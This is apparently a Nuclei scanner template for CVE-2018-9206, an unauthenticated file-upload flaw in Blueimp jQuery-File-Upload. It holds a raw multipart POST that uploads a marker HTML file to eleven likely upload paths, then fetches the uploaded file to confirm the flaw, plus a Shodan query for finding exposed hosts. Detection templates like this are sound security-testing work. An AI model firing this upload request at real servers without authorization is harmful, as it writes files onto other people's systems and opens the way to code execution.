id: CVE-2018-9206

info:
  name: Blueimp jQuery-File-Upload - Unrestricted File Upload
  author: danlika,princechaddha
  severity: critical
  description: |
    Blueimp jQuery-File-Upload versions <= 9.22.0 are vulnerable to unauthenticated arbitrary file upload. This allows remote attackers to upload and execute arbitrary code by uploading malicious files. The vulnerability exists due to insufficient validation of file types in the upload component.
  reference:
    - http://www.vapidlabs.com/advisory.php?v=204
    - https://nvd.nist.gov/vuln/detail/CVE-2018-9206
    - https://www.exploit-db.com/exploits/45790
    - https://github.com/blueimp/jQuery-File-Upload/pull/3514
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-9206
    cwe-id: CWE-434
  metadata:
    verified: true
    shodan-query: 'http.component:"jQuery-File-Upload"'
  tags: cve,cve2018,jquery,fileupload,rce,unauth,blueimp,kev

variables:
  marker: "{{rand_base(8)}}"

http:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}
        Accept: */*

        ------WebKitFormBoundary{{randstr}}
        Content-Disposition: form-data; name="files[]"; filename="{{marker}}.html"
        Content-Type: text/html

        <html><head><title>pwned</title></head><body>{{marker}}</body></html>
        ------WebKitFormBoundary{{randstr}}--

    payloads:
      path:
        - "{{BaseURL}}/server/php/index.php"
        - "{{BaseURL}}/example/upload.php"
        - "{{BaseURL}}/php/index.php"
        - "{{BaseURL}}/jQuery-File-Upload/server/php/index.php"
        - "{{BaseURL}}/assets/jQuery-File-Upload/server/php/index.php"
        - "{{BaseURL}}/backend/server/php/index.php"
        - "{{BaseURL}}/jquery-file-upload/server/php/index.php"
        - "{{BaseURL}}/fileupload/server/php/index.php"
        - "{{BaseURL}}/file-upload/server/php/index.php"
        - "{{BaseURL}}/upload/server/php/index.php"
        - "{{BaseURL}}/index.php"

    attack: pitchfork
    stop-at-first-match: true

    extractors:
      - type: regex
        name: upload_url
        group: 1
        regex:
          - '"url":"([^"]+)"'
        internal: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"name":"{{marker}}.html"'
          - '"url":"'
        part: body
        condition: and

  - method: GET
    path:
      - "{{upload_url}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<html><head><title>pwned</title></head><body>{{marker}}</body></html>"
        part: body
